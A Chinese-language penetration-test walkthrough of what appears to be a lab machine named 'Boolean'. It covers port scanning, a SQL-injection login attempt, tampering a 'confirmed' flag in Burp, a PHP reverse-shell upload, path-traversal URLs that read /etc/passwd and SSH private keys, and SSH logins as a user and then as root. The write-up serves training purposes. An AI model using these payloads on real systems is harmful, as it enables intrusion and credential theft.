针对服务器进行端口探测

```
sudo nmap -p- -vvv --min-rate 10000 192.168.166.231
```

![image-20241117195006517](https://s2.loli.net/2024/11/17/nyJQB2MpsvgNq9V.png)

针对开放端口进行进一步的端口服务探测

```
sudo nmap -p22,80,3000,33017 -A 192.168.166.231 -oX Boolean.xml
```

![image-20241117195108772](https://s2.loli.net/2024/11/17/cUIvo4RsZht6w13.png)

22端口没有可以直接利用的漏洞，我们从80及33017两个http端口进行检查

```
dirsearch -u http://192.168.166.231/login/ -w /usr/share/wordlists/dirb/big.txt -f -e php,txt,html
dirsearch -u http://192.168.166.231:33017/ -w /usr/share/wordlists/dirb/big.txt -f -e php,txt,html
```

![image-20241117203559730](https://s2.loli.net/2024/11/17/sH8dY2jOA4hW6yw.png)

![image-20241117203609184](https://s2.loli.net/2024/11/17/Exj2wIHmu6YJ3k7.png)

针对403的页面我们也尝试使用403bypass的工具，均没有成功。

我们针对login尝试使用sql注入登录绕过

```
User:admin
Password:'1 or 1=1-- 
```

也无法成功，我们尝试注册一个用户，然后进行登录，结果跳出要外面邮件确认的该页面

![image-20241117203728732](https://s2.loli.net/2024/11/17/HR13vu2zFUfsyOn.png)

我们通过burp抓包，发现在email确认这部的返回有一个confirmed的值是false，我们尝试将这个参数的值直接修改为true，我们将这个包发送到repeater

![image-20241117204837815](https://files.seeusercontent.com/2026/04/06/E0rd/image-20241117204837815.png)

![image-20241117204908024](https://s2.loli.net/2024/11/17/HwOmgAxFzPLBSXh.png)

我们已经能够直接进入了，我们尝试进行反弹脚本上传，相应的文件路径如下：

http://192.168.166.231/?cwd=&file=php-reverse-shell.php&download=true

尝试了各种方法无法直接执行，但我们目前拥有了相应的参数，是否可能存在目录遍历或者文件包含漏洞

http://192.168.166.231/?cwd=../../../../../etc/&file=passwd&download=true

![image-20241117210141527](https://s2.loli.net/2024/11/17/c4qTUADNgRp3aeF.png)

我们成功获取目标系统的/etc/passwd文件，实际具有/bin/bash的只有root和remi两个用户

我们尝试访问shadow文件但失败，我们尝试访问remi的.ssh文件夹的id_rsa文件，因为目标服务器开启了SSH服务，如果我们获取到就能够进行登录

http://192.168.166.231/?cwd=../../../../../home/remi/&file=.ssh&download=true

![image-20241117210639054](https://s2.loli.net/2024/11/17/rhlpbDCsRBj6taI.png)

![image-20241117210711447](https://s2.loli.net/2024/11/17/GbcS4woTXWi9Yqr.png)

我们可以看到目录还有一层key

http://192.168.166.231/?cwd=../../../../../home/remi/.ssh/keys/&file=id_rsa&download=true

```
chmod 600 id_rsa
ssh -i id_rsa remi@192.168.166.231
```

![image-20241117210949327](https://s2.loli.net/2024/11/17/5udvMUDO7Zzmhoq.png)

仍然需要一个密码，我们观察就会发现目标服务器缺少公钥，我们需要自己创建一堆公私钥(https://mqt.gitbook.io/oscp-notes/ssh-keys?source=post_page-----9c7f5b963559--------------------------------)

```
ssh-keygen
```

![image-20241117212021342](https://s2.loli.net/2024/11/17/5eDV1Kt43Wp9CUF.png)

```
cp /home/zkpc/.ssh/id_ed25519 . 
cp /home/zkpc/.ssh/id_ed25519.pub . 
cp id_ed25519.pub authorized_keys
```

![image-20241117212118769](https://s2.loli.net/2024/11/17/Vb6YiLP4Jcqeofp.png)

上传对应公钥

```
chmod 600 id_ed25519
ssh -i id_ed25519 remi@192.168.166.231
```

![image-20241117212148793](https://s2.loli.net/2024/11/17/bWa527qkMt9Csv8.png)

成功登录，接着我们记得之前在.ssh文件中看到一个叫root的文件，我们进行查看

![image-20241117212312404](https://s2.loli.net/2024/11/17/jSRlAGF74vszChk.png)

是一个root的私钥，我们直接在服务端进行ssh进行登录，但会一直显示失败

```
ssh -i root root@127.0.0.1
```

![image-20241117213719990](https://s2.loli.net/2024/11/17/FrbCdSywo3cp6jU.png)

我们查找了下原因，可能是因为ssh客户端在尝试指定文件的时候，自动尝试了其他身份验证方法，我们需要修改下命令（https://www.tecmint.com/fix-ssh-too-many-authentication-failures-error/)

```
ssh -i root -o IdentitiesOnly=yes root@127.0.0.1
```

![image-20241117215256067](https://s2.loli.net/2024/11/17/BNu7zxZVqloa3Ug.png)
